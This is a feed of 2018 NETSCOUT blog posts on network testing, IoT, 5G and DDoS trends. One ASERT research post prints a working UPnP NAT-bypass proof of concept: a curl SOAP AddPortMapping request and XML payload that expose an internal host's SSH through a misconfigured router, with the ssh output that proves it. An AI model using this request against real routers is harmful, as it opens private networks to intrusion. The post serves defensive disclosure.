<p>Further complicating this challenge, IoT devices are increasingly reliant on network-delivered power. Of the billions of IoT devices in use across the globe already, most are connected via 802.3 Ethernet or 802.11 wireless LANs. For these Power over Ethernet (PoE) enabled devices, there is an urgent need for tools to measure PoE under load at the connection point, comparing requested to received power levels. &nbsp;After all, any loss in functionality due to power fluctuations will result in reduced efficiency or outright device failure.</p>

<p>The manual testing of all devices on a network where a faulty device exists creates a tremendous strain on IT resources. Instead, what is needed is automation of maintenance, testing and security, particularly when the connected devices are wireless. Field engineers require flexible, programmable smart tools to address this vitally important IT mandate.</p>

<p>NETSCOUT offers a range of handheld tools to help field engineers rapidly test and validate network connectivity. The <a href="https://enterprise.netscout.com/products/linkrunner-g2" target="_blank">LinkRunner G2</a> is the world’s first Android-based smart network tester that combines wired Ethernet testing, hardened Android OS and unique PoE ‘under load’ testing capabilities in a single handheld device.</p>

<p>As the IoT continues to grow, and network-connected devices proliferate, next-generation test tools such as LinkRunner G2 will empower field engineers and IT professionals to speed up deployments and dramatically improve troubleshooting and problem identification capabilities. Such automated tools will reduce finger pointing, drive cost savings, and improve the efficiency and effectiveness of network operations.</p>

<p>This blog is based on the article, <a href="http://edition.pagesuite-professional.co.uk/html5/reader/production/default.aspx?pubname=&amp;edid=7033b40d-d23c-432e-a867-2d9adc2e0ee9" target="_blank"><em>Do more, with less: the challenges of maintenance in a digital &amp; wireless world </em></a>written by Daniel Klimke, Senior Product Manager for</p>

<p>NETSCOUT’s Handheld Network Tools division, which was published at Electronic Product Design &amp; Test.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/Digital_Wireless_Testing_0.jpg" length="105751" type="image/jpeg"/>
    <guid isPermaLink="false">d58458d4-dc79-4ce5-8585-235cb4110de1</guid>
    <pubDate>Thu, 31 May 2018 13:23:25 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Daniel Klimke</dc:creator>
    </item>
<item>
  <title>Smart Data is Key for New Revenue Opportunities</title>
  <link>http://localhost:7996/blog/smart-data-key-new-revenue-opportunities</link>
  <description>A recent market research report predicts global IIoT will reach approximately $232 billion by 2023, growing at a CAGR of around 8.06 percent between 2018 and 2023.</description>
  <content:encoded><![CDATA[<p>As Internet of Things (IoT) and Industrial Internet of Things (IIoT) growth heats up, telecommunication service providers have an opportunity to move beyond simply being a supplier of connectivity to grabbing a share of this burgeoning market. A recent market <a href="https://globenewswire.com/news-release/2018/04/24/1486362/0/en/Global-Industrial-Internet-of-Things-IIoT-Market-Will-Reach-USD-232-15-Billion-by-2023-Zion-Market-Research.html" target="_blank">research report </a>predicts global&nbsp;IIoT will reach approximately $232 billion by 2023, growing at a CAGR of around 8.06 percent between 2018 and 2023.</p>

<p>With the widespread adoption of 5G, connected devices, sensors and machines will soon be producing massive amounts of data, which in turn presents both a challenge and an opportunity for service providers. The data produced by IIoT and IoT will require providers to develop new business models that will rely on greater network capacity to fully exploit this mountain of data.</p>

<p>The key to leveraging new revenue opportunities - made possible by IoT transactions - is to tap into smart data. This is the meta-data generated by network traffic in real time, and includes critical insights into the user experience. Service level agreements offer providers a new source of revenue.</p>

<p>Because IIoT and IoT devices and services have different bandwidth and availability requirements, any failures and disruptions to the networks they are dependent on can be extremely costly. While the latency needs of services such as telemedicine, networked autonomous cars, robotics, power plant sensors, smart meters, etc. may vary, there will always be a premium placed on reliability. As applications and subsystems become more interdependent, assuring performance becomes more challenging. This challenge is compounded by the fact that manufacturers need to bring IoT devices to market quickly and cost-effectively, while still ensuring the security of services.</p>

<p>This is where a <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-05.14.18">smart data approach</a> can be a game-changer. Proactive network traffic monitoring can help identify obvious traffic patterns and potential security threats and attacks. With an ever increasing amount of data being captured, growing network complexity, and rising security risks, providers are ideally positioned to monitor network traffic for anomalies and risks, and thereby offer this as a service to companies.</p>

<p>Using service level agreement models, service providers can position themselves to support the service and security assurance of mission-critical IoT applications, thus allowing them to tap into new revenue opportunities.</p>

<p><br />
This blog is based on the article, <a href="https://www.computerwoche.de/a/tk-dienstleister-muessen-sich-anteil-am-digital-markt-sichern,3544279" target="_blank"><em>Telecommunication service providers have to secure a share in the digital market</em></a> written by Dr. Martin Klapdor, Senior Solutions Architect for NETSCOUT, which was published at ComputerWoche.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart_data_iot.jpg" length="227104" type="image/jpeg"/>
    <guid isPermaLink="false">a1b83a21-13f7-4dd3-a92e-e2eab02aff6a</guid>
    <pubDate>Wed, 30 May 2018 16:53:15 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Martin Klapdor</dc:creator>
    </item>
<item>
  <title>The Rise and Fall of Memcached</title>
  <link>http://localhost:7996/blog/rise-and-fall-memcached</link>
  <description>About 3 months ago, the Internet experienced the largest DDoS attack ever, reaching the unprecedented level of 1.7 Tbps. This was shortly followed by another attack reaching 1.3 Tbps and numerous smaller attacks.</description>
  <content:encoded><![CDATA[<p>About 3 months ago, the Internet experienced the largest DDoS attack ever, reaching the unprecedented level of 1.7 Tbps.   This was shortly followed by another attack reaching 1.3 Tbps and numerous smaller attacks.   These attacks were based on taking advantage of unsecured Memcached installations around the world, using them as unsuspecting tools in DDoS Reflection type attacks. </p>

<p>But what has happened in the last 3 months after the initial wave of publicity?</p>

<p>Based on publicly available information on Memcached installations worldwide<em>,</em> then at the end of February 2018, there were around 50,000 unsecured Memcached installations on the Internet that could be used as DDoS Reflectors.  In the weeks following the large attacks, this number dropped very quickly down to 20,000 and has since then gradually declined down to around 3,500 installations.</p>

<p>Looking at ATLAS data on Memcached attacks for the same 3-month period, the attack frequency dropped dramatically until around the beginning of April where it began to increase.  At the end of April, the attack frequency increased, reaching almost the same levels in mid-May as they were back in February.   Digging further into the data, the main reason for this apparent increase is because ATLAS began to receive attack statistics from Arbor customers in the Asia, Africa, and Europe regions, increasing the total visibility into the global DDoS traffic.   Taking this increase into consideration, the attack frequency has remained flat since March.</p>
<img alt="DDoS Attacks - Frequency" data-entity-type="file" data-entity-uuid="29fc0ad6-740d-4782-974f-9d9fc2282f73" src="http://localhost:7996/sites/default/files/inline-images/The%20Rise%20and%20Fall%20of%20Memcached%20image%202.jpg" class="align-center" /><p> </p>

<p>This demonstrates that even while the number of vulnerable services decrease and customers are more aware of Memcached threat vector, the attackers adapt accordingly and have managed to weaponize Memcached as an attack tool.</p>

<ol><li>The initial attacks were launched by skilled attackers which had done the research necessary to identify a new DDoS reflection vector and how to take advantage of it. After the initial attacks, the attack volume decreased as the attackers had proven their point and the number of vulnerable systems around the world were secured.</li>
	<li>In early April, a proof-of-concept attack tool using Memcached was released on Github, making it easy for anyone to launch these kinds of attacks.</li>
	<li>By late April, the Booter/Stresser community began offering Memcached as an attack vector, effectively weaponizing Memcached and making it easy to use as an attack tool for anyone. These attacks were done using both vulnerable services on the Internet and but also using their own pre-deployed vulnerable installations.</li>
	<li>As Memcached is such an effective DDoS reflector (can reach amplification levels up to 1:500,000), the Booter/Stresser community doesn’t have to rely on finding and taking advantage of unsecure installations. They can simply deploy their own vulnerable servers around the world at various Hosting Providers, paying with stolen credit cards or using one of the various Crypto Currencies.  These servers can then be used as Memcached DDoS reflectors until the Hosting Provider detects the abuse of their services and takes the servers down.</li>
</ol><p>This demonstrates that the time from the discovery of a new attack vector to a full-scale weaponization of the attack, can be very short, in this case less than 3 months.  Memcached has now become just another attack vector for DDoS attacks, just like DNS, NTP, SSDP and numerous other actively used attack vectors. </p>

<p>New attack vectors will certainly appear in the future as the attackers are always looking for new vulnerabilities, both in existing solutions but also in new services and technologies.</p>

<p>As explained in the <a href="https://asert.arbornetworks.com/memcached-reflection-amplification-description-ddos-attack-mitigation-recommendations/" target="_blank">ASERT blog on Memcached</a>, published February 27<sup>th</sup> 2018, detecting and mitigating Memcached attacks is matter of implementing Security Best Practices and deploying Intelligent DDoS Mitigation Systems (IDMS) such as Arbor SP/TMS and Arbor APS where appropriate.  Rate-limiting inbound traffic on UDP/TCP port 11211 (and outbound traffic where appropriate) has also been shown to be highly effective in limiting the impact of such attacks.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/ddos">DDoS</category>
    <enclosure url="http://localhost:7996/sites/default/files/Rise%20and%20Fall%20of%20DDoS%20image%201.jpg" length="970708" type="image/jpeg"/>
    <guid isPermaLink="false">cbf38fd0-66c0-457c-b76c-5fddd1bb4abc</guid>
    <pubDate>Tue, 29 May 2018 12:42:24 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The Rise of Network Virtualization Demands Service Assurance</title>
  <link>http://localhost:7996/blog/rise-network-virtualization-demands-service-assurance</link>
  <description>The rollout of network functions virtualization tools is likely to be a gradual process, as providers take a considered approach that identifies the specific applications or services that are appropriate for their virtual infrastructure.</description>
  <content:encoded><![CDATA[<p>As mobile operators move toward virtualized infrastructures to automate rapidly evolving telecom networks, the need to maintain service assurance has never been greater. The rollout of network functions virtualization tools is likely to be a gradual process, as providers take a considered approach that identifies the specific applications or services that are appropriate for their virtual infrastructure. Firewalls, IMS core functionality and DNS functions are just some examples that operators will consider as they virtualize.</p>

<p>To meet growing virtualization challenges, NETSCOUT offers its combination of service assurance, cybersecurity, and business analytics solutions. This industry-leading approach has been honed through years of experience with communication service providers and large-scale enterprises that have been engaged in digital transformation efforts.</p>

<p>As <a href="https://www.netscout.com/news/article/big-data-intelligence-5g/?ls=PR-MKTG&amp;lsd=blog-052318-1">5G network</a> slicing comes into play - which calls for application service network and spectrum resources to be automatically provisioned on an end-to-end virtual network - service assurance tools will need to evolve to meet performance demands. NETSCOUT is already prepared to meet these 5G service assurance requirements having acquired an extensive understanding of latency-sensitive applications from working with clients in the financial sector.&nbsp;</p>

<p>While operators spin up their 5G networks, NETSCOUT is well positioned to support these changes. Because NETSCOUT solutions operate at the VNF layer, we are able to put together a micro-service to monitor interoperation with other networks.</p>

<p>In addition, NETSCOUT is keenly focused on the Internet of Things (IoT), as we work with the LTE-M and NB-IoT networks. The volume of data produced by IoT devices offers a tremendous opportunity for operators. We are able to deliver service assurance by turning real-time network data into actionable insights that allow operators to improve network and user quality of experience – at the same time ensuring adherence to service-level agreements.</p>

<p>This blog is based on the article, <a href="https://www.rcrwireless.com/20180306/big-data-analytics/netscout-q-a-service-assurance-network-virtualization-tag17" target="_blank"><em>Netscout Q&amp;A: Service assurance in the age of network virtualization</em></a> published on RCR Wireless News.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/telecom%20networks.jpg" length="718402" type="image/jpeg"/>
    <guid isPermaLink="false">d1d2a0ad-100b-47a2-9440-6b1e14a9c0b4</guid>
    <pubDate>Thu, 24 May 2018 17:02:14 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Moving Data Center Capabilities to the Edge of the Network</title>
  <link>http://localhost:7996/blog/moving-data-center-capabilities-edge-network</link>
  <description>According to a recent IDC study, 45 percent of all data created by IoT devices will be stored, processed, analyzed and acted upon close to or at the edge of a network by 2020.</description>
  <content:encoded><![CDATA[<p>With 5G fast approaching and IoT traffic on the rise, it’s little wonder that operators are girding for an avalanche of data. Migrating cloud, compute and processing power to the network edge is seen as the best way to meet the ultra-low latency and interactive needs of 5G applications, such as connected cars. According to a recent <a href="https://www.idc.com" target="_blank">IDC</a> study, 45 percent of all data created by IoT devices will be stored, processed, analyzed and acted upon close to or at the edge of a network by 2020.</p>

<p>As mobile edge computing - or as it is also known, multi-access edge computing - rapidly moves from concept to reality, operators face a number of important questions. How will 5G applications interact with and impact complex new network infrastructures? And what type of traffic patterns will emerge with IoT once networks must handle driverless cars, automated factories and connected production lines? No doubt having an accurate view of what’s going on across the network will be imperative.</p>

<p>As operators invest in infrastructure to meet future capacity demands, many of those decisions are based on current data traffic trends and volumes. This approach is not fool proof, and will likely leave operators constantly having to adjust network conditions in order to maintain optimal performance.</p>

<p>Moving data center capabilities to the edge of the network will allow operators to put infrastructure in place that is more adroit at meeting the needs of 5G and IoT. This will generate a wealth of smart data that operators can use to better allocate capacity where it's needed the most to manage IoT traffic. At the same time, smart data will alert operators when there's a problem with 5G networks before it cascades and impacts countless IoT devices.</p>

<p><a href="https://www.netscout.com/solutions/iot-monitoring/carrier-services/?ls=PR-MKTG&amp;lsd=blog-052218-1">Smart data solutions</a>, such as those offered by NETSCOUT, enable operators to obtain visibility throughout the IoT lifecycle – particularly as they move network infrastructure to the edge, harnessing NFV and cloud to deliver new services and applications. Armed with a smart data solution, operators can monitor the entire IoT ecosystem to be certain everything is assured and connected.</p>

<p>Smart data will be key to ensuring the successful deployment of mobile edge computing, from testing through to monitoring and analysis of live traffic, to network orchestration and automation.</p>

<p>This blog is based on the article, <a href="https://www.lightreading.com/the-edge/future-network-investments-hampered-by-outdated-thinking/a/d-id/741064" target="_blank"><em>Future Network Investments Hampered by Outdated Thinking</em></a> written by John English, Senior Product Manager, Service Providers for NETSCOUT, which was published on The Edge.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/data%20center.jpg" length="157352" type="image/jpeg"/>
    <guid isPermaLink="false">cc409182-cafb-46a6-b57d-60387e5dbd84</guid>
    <pubDate>Wed, 23 May 2018 14:11:54 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>The Importance of Being Accurate: SSDP Diffraction Attacks, UDP Refraction Attacks, and UPnP NAT Bypass</title>
  <link>http://localhost:7996/blog/asert/importance-being-accurate-ssdp-diffraction-attacks-udp</link>
  <description>Written by Roland Dobbins, ASERT Principal Engineer &amp; Matt Bing, ASERT Security Analyst. In this article: SSDP Diffraction Attacks aren’t new; they’ve been observed in the wild since 2015. ‘Evasive Amplification’ attacks, aren’t. UPnP NAT Bypass is real. SSDP Diffraction Attacks - Targeting ISP and Enterprise Networks since 2015 Three years ago, Arbor and Arbor customers...</description>
  <content:encoded><![CDATA[<p>Written by Roland Dobbins, <em>ASERT Principal Engineer</em> &amp; Matt Bing, <em>ASERT Security Analyst</em>. In this article:</p>

<ul>
	<li>SSDP Diffraction Attacks aren’t new; they’ve been observed in the wild since 2015.</li>
	<li>‘Evasive Amplification’ attacks, aren’t.</li>
	<li>UPnP NAT Bypass is real.</li>
</ul>

<p><strong>SSDP Diffraction Attacks - Targeting ISP and Enterprise Networks since 2015</strong></p>

<p>Three years ago, Arbor and Arbor customers observed a <em>then-new</em> variation of <a href="https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol" title="SSDP">SSDP</a> reflection/amplification DDoS attacks which involved attacker-initiated SSDP M-SEARCH replies sourced not from the usual UDP/1900 (plus non-initial fragments), but instead from a seemingly pseudo-random range of UDP source ports on the abusable CPE devices being leveraged as SSDP reflectors/amplifiers.</p>

<p>At first, this non-standard, high-source-port SSDP attack traffic was generally mixed in with the usual UDP/1900-sourced SSDP attacks. But within a few weeks, we were observing SSDP reflection/amplification attacks consisting almost entirely of high-source-port traffic. This is indicative that the creators of DDoS attack infrastructure (both private botnets and publicly-accessible booter/stresser DDoS-for-hire services) were initially unaware that some abusable SSDP reflectors/amplifiers were exhibiting this behavior; once they realized that there was a population of reflectors/amplifiers which would generate pseudo-random high-source-port replies, they deliberately identified and specified those specific SSDP reflectors/amplifiers in their attack tools.</p>

<p>While we were initially unsure precisely <em>how</em> the attackers were generating this high-source-port SSDP DDoS attack traffic, <a href="http://localhost:7996/product/arbor-sightline" title="Arbor SP">Arbor SP</a> and <a href="https://www.netscout.com/product/arbor-threat-mitigation-system" title="Arbor TMS">Arbor TMS</a> successfully detected, classified, traced back, and mitigated these ‘minute-0’ attacks. And when these high-port-sourced SSDP reflectors became the DDoS attack methodology of choice for the high-profile ‘DD4BC’ DDoS extortion threat actor, we <a href="https://app.box.com/s/776tkb82634ewvzvp26nnout6v4ij39q" title="DDoS extortion presentation">presented</a> what we <em>thought</em> knew at the time about how this SSDP <a href="https://en.wikipedia.org/wiki/Diffraction" title="Diffraction">diffraction</a> DDoS attack traffic was being generated (see pp. 34-57 of the <a href="https://app.box.com/s/776tkb82634ewvzvp26nnout6v4ij39q" title="DDoS extortion presentation">.pdf presentation</a>) at multiple network industry conferences worldwide throughout 2015.</p>

<p>We also speculated that however the attackers were causing this <a href="https://en.wikipedia.org/wiki/Diffraction">diffracted</a> attack traffic to be generated, it might potentially allow them to directly <a href="https://www.youtube.com/watch?v=OapWdclVqEY" title="Reach Out and Touch Someone">reach out and touch</a> devices located <em>behind</em> the CPE NAT service, which would have very serious implications in terms of the ability of attackers to compromise and subvert devices and services on supposedly private internal networks. [More on this in a bit.]</p>

<p>So, contrary to recent assertions that SSDP diffraction DDoS attacks are somehow a ‘new’ DDoS attack methodology, they’ve been successfully detected, classified, traced back, and mitigated by Arbor and Arbor customers since 2015, and have been discussed extensively by the global operational community since Arbor’s presentations about these attacks at multiple industry networking conferences in that timeframe.</p>

<p><strong>So, How Do Attackers Actually Generate SSDP Diffraction DDoS Attacks?</strong></p>

<p><a href="https://pc.nanog.org/static/published/meetings//NANOG72/daily/day_3.html#1633" title="SSDP DDoS Attack Presentation Abstract">An extensive investigation</a> by Matt Bing of the ASERT team revealed that of the ~2 million abusable SSDP reflectors/amplifiers on the public Internet as of this writing, ~1.1 million of them incorporate a flawed open-source <a href="https://en.wikipedia.org/wiki/Universal_Plug_and_Play" title="UPnP">UPnP</a> <a href="http://pupnp.sourceforge.net/" title="libupnp">library</a> which results in SSDP M-SEARCH responses - the type of messages stimulated by attackers in SSDP reflection/amplification attacks - being sourced from pseudo-random UDP ephemeral ports, rather than the usual UDP/1900 source port. Matt’s <a href="https://www.nanog.org/" title="NANOG">NANOG</a> presentation from February of 2018 can be viewed <a href="https://www.youtube.com/watch?v=GuWpVtnyHKA" title="ASERT's Matt Bing presenting on the DIPTOSS method of initiating SSDP diffraction DDoS attacks.">here</a>.</p>

<p>All that’s required is that the botmasters and DDoS-for-hire infrastructure operators maintain relatively up-to-date lists of abusable SSDP reflectors/amplifiers which exhibit the desired behavior. This process is easily automated, so this isn’t much of an administrative burden for them.</p>

<p><strong>But What About So-Called ’Evasive Amplification’?</strong></p>

<p>In all the brouhaha about the supposedly ‘new’ threat of SSDP refraction DDoS attacks - which, as noted above, have been widely understood and successfully defended against since 2015 - a genuinely new, if somewhat overhyped, variation in UDP reflection/amplification DDoS attack generation dubbed ‘evasive amplification’ was posited as the attack methodology supposedly used to generate these ‘new’ (since 2015!) SSDP diffraction DDoS attacks. Of course, as we’ve already seen above, this isn’t actually the case.</p>

<p>As it turns out, there is in fact a very small population of abusable consumer-grade <a href="https://en.wikipedia.org/wiki/Customer-premises_equipment" title="Consumer Premises Equipment">CPE</a> SSDP reflectors/amplifiers which insecurely expose their UPnP control-plane to the Internet; this allows attackers to potentially re-map the NAT rules on the affected devices. By manipulating the NAT properties of these SSDP reflectors/amplifiers, attackers can cause reflection/amplification traffic to be arbitrarily re-mapped to non-standard source ports. So, for example, DNS reflection/amplification attack traffic could be remapped to UDP/<a href="https://en.wikipedia.org/wiki/Leet" title="l33t">1337</a> or another UDP source port of the attacker’s choice (this applies to the initial fragments, which have UDP source and destination port numbers; the non-initial UDP fragment component of these attacks doesn’t exhibit port numbers).</p>

<p>Of the total Internet population of ~2,000,000 abusable SSDP reflectors/amplifiers, there are only about ~33,000, or ~1.65%, which could potentially be manipulated in this manner. And since remapping of the NAT rules on the reflectors/amplifiers simply maps one fixed source port to another fixed source port, it’s quite obvious that the broken SSDP library cited above, and not NAT rule manipulation by attackers, is what enables SSDP diffraction attacks.</p>

<p>It’s also important to note that there are potentially tens of thousands of abusable UDP services/applications which attackers can leverage to generate high-volume UDP reflection/amplification DDoS attacks. So, the ability to perform unauthorized manipulation of NAT rules on a small population of SSDP reflectors/amplifiers is relatively operationally complex for the attacker, and given the breadth of UDP services which can easily be abused, doesn’t really constitute a significant material change in the overall DDoS threat landscape.</p>

<p>And given that state-of-the-art DDoS mitigation solutions such as <a href="https://www.netscout.com/product/arbor-sightline" title="Arbor SP">Arbor SP</a>/<a href="https://www.netscout.com/product/arbor-threat-mitigation-system" title="Arbor TMS">TMS</a> can readily detect, classify, traceback, and mitigate this so far entirely-theoretical subclass of DDoS attacks, as well as UDP reflection/amplification attacks generally, we believe that ‘UDP <a href="https://en.wikipedia.org/wiki/Refraction" title="Refraction">refraction</a> attacks’ is a better way to describe them, since <em>they can’t actually evade</em> modern DDoS defense technology.</p>

<p><strong>NAT Bypass, <a href="https://en.wiktionary.org/wiki/OTOH" title="OTOH">OTOH</a>, is a Real Possibility</strong></p>

<p>When we first observed and assisted Arbor customers in mitigating SSDP diffraction attacks back in 2015, we weren’t sure precisely <em>how</em> the attack traffic was being generated, but we theorized that it might be possible for attackers to somehow manipulate UPnP NAT rules in order to allow them to potentially compromise and subvert UPnP-capable devices/applications which registered themselves with their respective CPE UPnP gateway services. While it turns out that we were initially mistaken about the <a href="https://www.youtube.com/watch?v=GuWpVtnyHKA" title="ASERT's Matt Bing presenting on the DIPTOSS method of initiating SSDP diffraction DDoS attacks.">actual attack methodology</a>, it appears that in the larger context of UPnP NAT bypass, our suspicions were well-founded.</p>

<p>It turns out that the ~1.65% of abusable SSDP consumer CPE devices which inadvertently allow NAT rule manipulation by attackers are vulnerable due to a misconfigured-from-the-factory <a href="http://miniupnp.free.fr">MiniUPnP</a> implementation and configuration. And with a little bit of work, <em>we were able to successfully force the mapping of TCP/2222 from a public IP address to TCP/22 on an internal, NATted RFC1918 address, thereby accessing ssh running on a supposedly safe and secure Linux machine sitting behind the NAT!</em></p>

<p>Here’s our test topology:</p>

<p><strong>Attacker (192.0.2.4) ---&gt; UPnP CPE NAT (172.16.145.136 public/192.168.1.1 internal) ---&gt; Victim host (192.168.1.200)</strong></p>

<p>And here are the commands we used to set up the unauthorized NAT mapping rules:</p>

<pre>
<code>% curl -H 'Content-Type: text/xml' \
    -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"' \
    -d @addportmapping -X POST http://172.16.145.136:35221/WANIPCn.xml
 
% cat addportmapping
&lt;?xml version="1.0" ?&gt;
    &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
    &lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"&gt;
    &lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;
    &lt;NewExternalPort&gt;2222&lt;/NewExternalPort&gt;
    &lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;
    &lt;NewInternalPort&gt;22&lt;/NewInternalPort&gt;
    &lt;NewInternalClient&gt;192.168.1.200&lt;/NewInternalClient&gt;
    &lt;NewEnabled&gt;1&lt;/NewEnabled&gt;
    &lt;NewPortMappingDescription&gt;LOLOLOLOLOLOL&lt;/NewPortMappingDescription&gt;
    &lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;
    &lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;
    &lt;/s:Envelope&gt;
 
As above, TCP/2222 on linuxtest will now get forwarded to TCP/22 on the
 non-Internet-accessible, NATted, victim host. This allows us to abuse it from the public Internet!:
 
% ssh -p 2222 roger@172.16.145.136 ifconfig
ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.200  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fe07:868e  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:07:86:8e  txqueuelen 1000  (Ethernet)
        RX packets 1316  bytes 192184 (192.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 408  bytes 43338 (43.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>

<p>So, while ‘Evasive Amplification’ isn’t actually a factor in SSDP diffraction attacks, nor does it represent a significant alteration in the DDoS threat landscape, the underlying premise of unauthorized manipulation of UPnP NAT rules across the public Internet does in fact represent a potentially serious threat to confidentiality and integrity which must be addressed (so to speak).</p>

<p><strong>Lessons Learned</strong></p>

<p>One of the key strengths of Arbor is that the same ASERT personnel who research new DDoS attack methodologies and ways to counter them are also involved in assisting Arbor customers in mitigating large, complex DDoS attacks on the production Internet; this means that ASERT has a uniquely grounded and operationally-sound view of what constitutes actual threats to Internet security, and how to counter those threats. In particular, our combined decades of DDoS defense expertise and experience, as well as our attention to detail and careful assessment of prior art, allows us to provide useful architectural and operational guidance while ensuring that we fully explore the implications of potential new attack methodologies.</p>

<p>We strongly recommend that both commercial and academic DDoS researchers spend time with teams actively engaged in DDoS mitigation, as the operational experience gained will prove invaluable in accurately assessing both the practicality and potential impact of new, theoretical DDoS vectors, as well as in understanding the actual mechanisms and methodologies employed in real-world DDoS attacks. It is also recommended that DDoS researchers familiarize themselves with the wealth of prior art in terms of <a href="https://app.box.com/s/4h2l6f4m8is6jnwk28cg">best current practices</a> (BCPs) and well-known DDoS attack vectors. Finally, we suggest that DDoS researchers also participate in regional network industry conferences such as <a href="https://www.nanog.org/" title="NANOG">NANOG</a>, <a href="https://www.lacnic.net/1950/2/lacnic/our-meetings" title="LACNIC">LACNIC</a>, <a href="https://www.ripe.net/participate/meetings/ripe-meetings" title="RIPE">RIPE</a>, <a href="https://www.apricot.net/" title="APRICOT">APRICOT</a>, <a href="https://www.apnic.net/events/conferences/" title="APNIC">APNIC</a>, <a href="https://www.sanog.org/" title="SANOG">SANOG</a>, <a href="https://www.ausnog.net/events" title="AusNOG">AusNOG</a>, <a href="https://www.nznog.org/" title="NZNOG">NZNOG</a>, et. al., so as to ensure they’re fully up to speed on the latest DDoS attack methodologies and mitigation techniques.</p>

<p><em>Special thanks to Steinthor Bjarnason, Andrew Beard, Kaido Vahers, and Spencer Ryan.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">3201dc2a-c059-41d3-a120-d17c1feafb52</guid>
    <pubDate>Tue, 22 May 2018 14:52:26 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Monitoring SD-WAN and Other Overlay Networks</title>
  <link>http://localhost:7996/blog/monitoring-sd-wan-and-other-overlay-networks</link>
  <description>SD-WAN is the software defined networking solution for the edge and remote locations. It introduces another variable in the service delivery chain, and networking and application professionals must have a suitable visibility solution before deploying it.</description>
  <content:encoded><![CDATA[<p>Why should we care about monitoring and visibility into Software Defined Wide Area Networks (SD-WAN) in the first place?  Well, for one thing, analysts’ consensus estimates that the SD-WAN market will grow from roughly $90M in 2017 to over $4B in 2020.  Digital economy demands agility in responding to user requirements and delivering superb user experience.  The former is achieved via agile development and various software defined technologies.  The latter has to be managed.  SD-WAN is the software defined networking solution for the edge and remote locations.  What that means is it is here, it introduces another variable in the service delivery chain, and both networking and application professionals must have a suitable visibility solution before deploying it.  Anything less makes operational support and user experience difficult to manage if not impossible.</p>

<p><img alt="overlay" class="align-center" data-entity-type="file" data-entity-uuid="5ca9f416-ffaf-4e8d-9862-2bdcb2761e5f" src="http://localhost:7996/sites/default/files/inline-images/overlay.jpg" /></p>

<p> </p>

<p>Our enterprise customers tell us they see SD-WAN as a solution for leveraging broadband access to augment existing remote locations’ connectivity and availability, and to address out-of-region-coverage without the capex of owning the transport.  Another application of SD-WAN we are witnessing increasingly is to gain distributed secure access to the cloud.  What that means is direct access from remote locations to user-adjacent cloud locations as opposed to tromboning remote user traffic through the core to go to public cloud.  SD-WAN’s dynamic, software controlled access agnostic, performance-optimized, secure, and policy-driven connectivity hits the mark on the above list of requirements. This goodness is of course not without its challenges.  SD-WAN is an overlay network made up of encrypted tunnels in a fractured vendor landscape.  Encryption and lack of a standard visibility solution represent the first two visibility challenges.</p>

<p>From our service provider customers, we are also hearing that there is a push to simplify the branch office through replacing the clutter of customer premises equipment (CPE) (router, firewall, session border controller, WAN accelerator, etc.) with a single universal CPE (uCPE) made up of white box compute running a hypervisor with a vSwitch.  All existing CPE appliances can be replaced with a Virtual Network Function (VNF) running on the uCPE, which can be remotely provisioned and diagnosed.  This approach clearly represents not only increased agility but significant CapEx and OpEx reduction for the service providers.</p>

<p>The graphic below demonstrates how service providers will deploy uCPE VNFs.  These VNFs will form a service chain under the hypervisor.  What changes here is that now the network interaction between the edge firewall, load balancer, MPLS router, and SD-WAN will take place across the uCPE’s vSwitch.  This in turn creates the next monitoring and operational support challenge: lack of hop-by-hop visibility.</p>

<p><img alt="hypervisor/vswitch" class="align-center" data-entity-type="file" data-entity-uuid="ed872b2c-1737-4ffe-afba-7afec16f041e" src="http://localhost:7996/sites/default/files/inline-images/hypervisor.jpg" /></p>

<p> </p>

